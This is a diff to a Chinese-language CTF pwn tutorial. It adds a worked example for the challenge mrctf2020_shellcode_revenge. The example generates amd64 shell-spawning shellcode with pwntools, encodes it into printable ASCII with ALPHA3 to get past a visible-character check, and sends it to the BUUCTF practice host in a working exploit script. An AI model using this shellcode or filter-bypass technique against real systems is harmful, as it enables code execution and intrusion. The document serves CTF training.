@@ -35,6 +35,10 @@ ANSI_COLOR="1;31
 
 [hello ctf](https://hello-ctf.com/home/)
 
+[shellcode 的艺术](https://xz.aliyun.com/news/6249)
+
+[生成可打印的shellcode](https://xz.aliyun.com/news/5275)
+
 ## 安全保护检查
 
 设某道题附加可执行文件 ciscn 。
@@ -882,6 +886,85 @@ def main():
     io.sendline(shellcode)
     io.recvline()
     io.recvuntil(b"Thanks! Executing now...\n")
+    io.interactive()
+
+if __name__ == "__main__":
+    main()
+```
+
+##### 例题 4：mrctf2020_shellcode_revenge
+
+[BUU CTF 题目链接](https://buuoj.cn/challenges#mrctf2020_shellcode_revenge)
+
+安全检查：
+
+<img width="445" height="150" alt="image" src="https://github.com/user-attachments/assets/0f5573e2-2b46-4eef-a00e-e73fc9407373" />
+
+反编译依然不能看伪代码，但是看汇编中有明显的 payload 检查，要求 payload 是可见字符。
+
+<img width="1280" height="534" alt="image" src="https://github.com/user-attachments/assets/a5829d54-cb3d-4994-8ef8-a551a8705fc3" />
+
+最后跳到 payload 上，那么我们的 payload 就要求必须是题目指定白名单内的可见 shellcode。
+
+生成指定白名单的可见 shellcode，可以用使用 `ALPHA3` 生成要求的 shellcode。
+
+[ALPHA3](https://github.com/SkyLined/alpha3/tree/master)
+
+先把 shellcode 打印出来放一个文件里，这里的 shellcode 是机器码。
+
+```
+from pwn import *
+context(arch = "amd64",os = "linux")
+
+f = open("shellcode_x64","wb")
+shellcode = asm(shellcraft.sh())
+
+def main():
+    f.write(shellcode)
+    f.close()
+
+if __name__ == "__main__":
+    main()
+
+```
+
+现在我们已经打印到 `shellcode_x64` 文件上了，然后使用 ALPHA3 转成可见 ascii。
+
+以下面的常见命令为例：
+
+`python2 ALPHA3.py <arch> <charset_family> <charset_variant> <reg> --input=<raw_shellcode_file> > out.txt`
+
+
+* `<arch>`：x86 或者 x64。
+* `<charset_family>`：常见是 ascii（可见字符）。
+* `<charset_variant>`：mixedcase（大小写混合），uppercase（全大写）
+* `<reg>`：告诉 decoder 哪个寄存器指向你的 payload 起始地址
+  * 如果题目是 `call rax` / `jmp rax`，通常选 rax
+  * 如果题目是 `jmp rsp`，通常选 rsp
+* `--input=<file>`：原始 shellcode 的二进制文件（raw bytes）
+* 输出 `out.txt`
+
+对于这道题，IDA 的最后有 call rax。
+
+<img width="374" height="140" alt="image" src="https://github.com/user-attachments/assets/d39ea82b-504f-44b1-b489-0241e397ce30" />
+
+所以执行 `python2 ALPHA3.py x64 ascii mixedcase rax --input='shellcode_x64' > x64_out`，然后把 `x64_out` 的东西直接抄到 shellcode 即可。
+
+```
+# written by Sonnety
+from pwn import *
+context(arch = "amd64",os = "linux",log_level = "debug")
+
+host = "node5.buuoj.cn"
+port = 26289
+shellcode = "Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t"
+
+
+def main():
+    io = remote(host,port)
+    io.recvuntil(b"Show me your magic!\n")
+    io.send(shellcode)  # sendline() 的 \n 可能会破坏字符检查，应该使用 send()
+    # io.recvuntil(b"I Can't Read This!")
     io.interactive()
 
 if __name__ == "__main__":
